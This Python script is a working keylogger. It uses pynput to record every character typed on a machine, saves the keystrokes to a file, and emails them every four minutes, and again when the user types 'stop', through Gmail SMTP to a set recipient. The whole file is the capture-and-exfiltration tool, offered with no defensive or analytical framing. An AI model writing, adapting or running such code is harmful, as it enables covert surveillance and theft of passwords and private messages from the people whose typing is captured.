import pynput.keyboard
import time
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

gmail_email = "your_email@gmail.com"
gmail_password = "your_password"  
recipient_email = "recipient@example.com" 
pressed_keys = []
file_name = "keystrokes.txt"

def on_key_press(key):
    try:
        pressed_keys.append(key.char)
        
        if len(pressed_keys) >= 4 and "".join(pressed_keys[-4:]) == "stop":
            stop_monitoring()
    except AttributeError:
        pass

def stop_monitoring():
    print("Stopping the keystroke monitor.")
    keyboard_listener.stop()
    
    with open(file_name, "w") as file:
        file.write("".join(pressed_keys))
        print(f"Keystrokes saved to {file_name}")
    send_email("Keystrokes Saved", "".join(pressed_keys))

def print_saved_keystrokes():
    while True:
        time.sleep(240)
        if pressed_keys:
            print("Saved Keystrokes:")
            print("".join(pressed_keys))
            send_email("Saved Keystrokes", "".join(pressed_keys))

def send_email(subject, message):
    try:
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(gmail_email, gmail_password)
        
        msg = MIMEMultipart()
        msg["Subject"] = subject
        msg["From"] = gmail_email
        msg["To"] = recipient_email
        msg.attach(MIMEText(message, "plain"))
        server.sendmail(gmail_email, recipient_email, msg.as_string())
        

        server.quit()
    except Exception as e:
        print(f"Error sending email: {e}")

keyboard_listener = pynput.keyboard.Listener(on_press=on_key_press)
keyboard_listener.start()
import threading
printing_thread = threading.Thread(target=print_saved_keystrokes)
printing_thread.daemon = True
printing_thread.start()
keyboard_listener.join()
